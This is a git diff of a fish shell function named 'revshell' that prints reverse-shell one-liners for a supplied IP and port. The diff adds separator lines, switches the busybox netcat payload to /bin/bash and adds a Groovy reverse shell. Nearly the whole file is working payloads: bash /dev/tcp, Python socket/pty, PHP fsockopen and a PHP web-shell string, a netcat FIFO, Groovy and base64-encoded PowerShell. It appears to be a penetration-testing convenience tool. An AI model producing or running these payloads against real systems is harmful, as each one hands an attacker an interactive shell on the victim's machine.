@@ -7,8 +7,6 @@ function revshell --description 'Print reverse-shell one-liners (bash/python/php
     set -l ip $argv[1]
     set -l port $argv[2]
 
-    # URL Encode Command
-    echo -e "[+] Command to URL Encode: jq -nr --arg v \"<COMMAND TO ENCODE>\" '\$v|@uri'"
     # Bash reverse shell
     set -l bash_shell "/usr/bin/bash -i >& /dev/tcp/$ip/$port 0>&1"
 
@@ -22,14 +20,27 @@ function revshell --description 'Print reverse-shell one-liners (bash/python/php
     set -l ps_base64 (printf "%s" "$ps_cmd" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
 
     echo
-    echo "[+] busybox: busybox nc $ip $port -e sh"
+    # URL Encode Command
+    echo -e "[+] Command to URL Encode: jq -nr --arg v \"<COMMAND TO ENCODE>\" '\$v|@uri'"
+    echo ---------------------------------------------
+    echo "[+] busybox: busybox nc $ip $port -e /bin/bash"
+    echo ---------------------------------------------
     echo "[+] Java Runtime().exec: bash -c '$bash_shell'"
+    echo ---------------------------------------------
     echo "[+] Bash: $bash_shell"
+    echo ---------------------------------------------
     echo "[+] Bash Encoded: echo '$shell_encode' | base64 -d | /usr/bin/bash"
+    echo ---------------------------------------------
     echo "[+] Python: python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")'"
+    echo ---------------------------------------------
     echo "[+] PHP: php -r '\$s=fsockopen(\"$ip\",$port);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
+    echo ---------------------------------------------
     echo "[+] PHP simple Revshell: <?php echo system(\"0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196\"); ?>"
+    echo ---------------------------------------------
     echo "[+] Netcat FIFO: rm /tmp/wk; mkfifo /tmp/wk; cat /tmp/wk | /bin/bash -i 2>&1 | nc $ip $port"
-
+    echo ---------------------------------------------
+    echo "[+] Groovy: String host="$ip";int port=$port;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();"
+    echo ---------------------------------------------
     printf "[+] PowerShell (Base64): powershell -e %s\n" $ps_base64
+
 end
